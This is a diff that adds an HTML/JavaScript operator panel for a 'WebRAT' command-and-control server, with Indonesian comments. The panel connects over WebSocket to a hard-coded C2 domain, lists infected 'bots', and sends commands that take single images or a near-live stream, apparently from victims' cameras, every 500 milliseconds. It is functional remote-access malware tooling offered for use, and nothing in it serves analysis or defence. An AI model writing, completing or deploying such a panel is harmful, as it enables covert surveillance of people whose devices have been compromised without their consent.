@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>C2 Control Panel</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg: #0a0e1a; --card: #111827; --border: #1f2a3d;
+    --txt: #e6edf3; --muted: #7d8ba1; --accent: #3b82f6;
+    --ok: #10b981; --err: #ef4444; --warn: #f59e0b;
+  }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: radial-gradient(ellipse at top, #111d33 0%, var(--bg) 70%);
+    color: var(--txt); min-height: 100vh; padding: 24px;
+  }
+  body::before {
+    content: ''; position: fixed; inset: 0; z-index: 0; pointer-events: none;
+    background: radial-gradient(circle at 20% 30%, rgba(59,130,246,.08), transparent 40%),
+                radial-gradient(circle at 80% 70%, rgba(139,92,246,.06), transparent 40%);
+  }
+  .wrap { max-width: 1200px; margin: 0 auto; position: relative; z-index: 1; }
+  .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 28px; flex-wrap: wrap; gap: 16px; }
+  .brand { display: flex; align-items: center; gap: 14px; }
+  .brand-ico {
+    width: 44px; height: 44px; border-radius: 12px;
+    display: flex; align-items: center; justify-content: center;
+    background: linear-gradient(135deg, var(--accent), #8b5cf6);
+    color: #fff; font-size: 18px; box-shadow: 0 8px 20px -6px rgba(59,130,246,.5);
+  }
+  .brand-txt h1 { font-size: 18px; font-weight: 700; letter-spacing: -0.3px; }
+  .brand-txt p { font-size: 12px; color: var(--muted); }
+  .badge-live {
+    display: inline-flex; align-items: center; gap: 6px;
+    padding: 6px 12px; border-radius: 100px;
+    background: rgba(16,185,129,.12); border: 1px solid rgba(16,185,129,.3);
+    color: var(--ok); font-size: 12px; font-weight: 600;
+  }
+  .badge-live .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--ok); animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+  
+  .grid { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; align-items: start; }
+  @media (max-width: 900px) { .grid { grid-template-columns: 1fr; } }
+  
+  .card {
+    background: linear-gradient(160deg, var(--card) 0%, #1a2233 100%);
+    border: 1px solid var(--border); border-radius: 16px;
+    padding: 24px; box-shadow: 0 20px 40px -12px rgba(0,0,0,.5);
+  }
+  .card-title {
+    font-size: 15px; font-weight: 600; margin-bottom: 20px;
+    display: flex; align-items: center; gap: 10px; color: #fff;
+    border-bottom: 1px solid var(--border); padding-bottom: 14px;
+  }
+  .card-title i { color: var(--accent); }
+  
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  th, td { padding: 12px 14px; text-align: left; border-bottom: 1px solid var(--border); }
+  th { color: var(--muted); font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+  tr:hover { background: rgba(255,255,255,.02); }
+  .bot-id { font-family: monospace; color: #7eb3ff; font-weight: 600; }
+  
+  .btn {
+    padding: 8px 12px; border: 0; border-radius: 8px; font-size: 12px; font-weight: 600;
+    cursor: pointer; transition: all 0.2s; display: inline-flex; align-items: center; gap: 6px;
+  }
+  .btn-primary { background: rgba(59,130,246,.15); color: #7eb3ff; border: 1px solid rgba(59,130,246,.3); }
+  .btn-primary:hover { background: rgba(59,130,246,.25); }
+  .btn-success { background: rgba(16,185,129,.15); color: var(--ok); border: 1px solid rgba(16,185,129,.3); }
+  .btn-success:hover { background: rgba(16,185,129,.25); }
+  .btn-danger { background: rgba(239,68,68,.15); color: var(--err); border: 1px solid rgba(239,68,68,.3); }
+  .btn-danger:hover { background: rgba(239,68,68,.25); }
+  
+  #viewer { display: none; position: sticky; top: 24px; }
+  #viewer img { width: 100%; border-radius: 12px; background: #000; aspect-ratio: 4/3; object-fit: cover; border: 1px solid var(--border); }
+  .cam-status {
+    display: inline-flex; align-items: center; gap: 6px; margin-top: 16px;
+    font-size: 12px; color: var(--ok); background: rgba(16,185,129,.1);
+    padding: 6px 12px; border-radius: 6px; border: 1px solid rgba(16,185,129,.2);
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="header">
+    <div class="brand">
+      <div class="brand-ico"><i class="fa-solid fa-satellite-dish"></i></div>
+      <div class="brand-txt">
+        <h1>C2 Command Center</h1>
+        <p>WebRAT Node.js Operator Panel</p>
+      </div>
+    </div>
+    <div class="badge-live" id="status">
+      <div class="dot"></div> <span>Connecting...</span>
+    </div>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="card-title"><i class="fa-solid fa-robot"></i> Active Devices</div>
+      <table id="tbl">
+        <thead>
+          <tr>
+            <th>Bot ID</th>
+            <th>Status</th>
+            <th>Aksi Kontrol</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td colspan="3" style="text-align:center; color:var(--muted); padding:30px;">Menunggu koneksi masuk...</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="card" id="viewer">
+      <div class="card-title"><i class="fa-solid fa-eye"></i> Live Stream Viewer</div>
+      <img id="img" src="" alt="Menunggu gambar...">
+      <div class="cam-status"><i class="fa-solid fa-circle" style="font-size:8px"></i> Menerima data gambar</div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // GANTI DENGAN DOMAIN PTERODACTYL LO
+  const C2_URL = "http://nodezyrovex-respanelsukanyoli.r-cloud.web.id";
+  let ws;
+  let liveInterval = null;
+
+  function connect() {
+    ws = new WebSocket(C2_URL);
+    
+    ws.onopen = () => {
+      const st = document.getElementById('status');
+      st.innerHTML = '<div class="dot"></div> <span>C2 Online</span>';
+      ws.send(JSON.stringify({ type: 'op' })); 
+    };
+
+    ws.onmessage = (e) => {
+      const msg = JSON.parse(e.data);
+
+      // Bot baru nyambung
+      if (msg.type === 'bot_online') {
+        const tbody = document.querySelector('#tbl tbody');
+        if(document.getElementById('empty-row')) {
+          document.getElementById('empty-row').remove();
+        }
+        if(!document.getElementById('row-'+msg.id)) {
+          const tr = document.createElement('tr');
+          tr.id = 'row-' + msg.id;
+          tr.innerHTML = `
+            <td class="bot-id">${msg.id}</td>
+            <td><span style="color:var(--ok); font-size:12px;"><i class="fa-solid fa-circle" style="font-size:8px"></i> Online</span></td>
+            <td>
+              <button class="btn btn-success" onclick="startSnap('${msg.id}')"><i class="fa-solid fa-camera"></i> Snap</button>
+              <button class="btn btn-primary" onclick="startStream('${msg.id}')"><i class="fa-solid fa-video"></i> Live</button>
+              <button class="btn btn-danger" onclick="stopStream()"><i class="fa-solid fa-stop"></i> Stop</button>
+            </td>
+          `;
+          tbody.appendChild(tr);
+        }
+      }
+
+      // Terima gambar base64
+      if (msg.type === 'img') {
+        document.getElementById('viewer').style.display = 'block';
+        document.getElementById('img').src = msg.img; 
+      }
+    };
+    
+    ws.onclose = () => {
+      const st = document.getElementById('status');
+      st.innerHTML = '<div class="dot" style="background:var(--err)"></div> <span style="color:var(--err)">Reconnecting...</span>';
+      setTimeout(connect, 3000);
+    };
+  }
+
+  connect();
+
+  function startSnap(botId) {
+    if (ws.readyState !== 1) return alert("C2 Offline");
+    document.getElementById('viewer').style.display = 'block';
+    ws.send(JSON.stringify({ type: 'cmd', target: botId, cmd: 'snap' }));
+  }
+
+  function startStream(botId) {
+    if (ws.readyState !== 1) return alert("C2 Offline");
+    clearInterval(liveInterval);
+    document.getElementById('viewer').style.display = 'block';
+    
+    // Request gambar tiap 500ms (Live effect)
+    liveInterval = setInterval(() => {
+      ws.send(JSON.stringify({ type: 'cmd', target: botId, cmd: 'snap' }));
+    }, 500);
+  }
+
+  function stopStream() {
+    clearInterval(liveInterval);
+    liveInterval = null;
+  }
+</script>
+</body>
+</html>
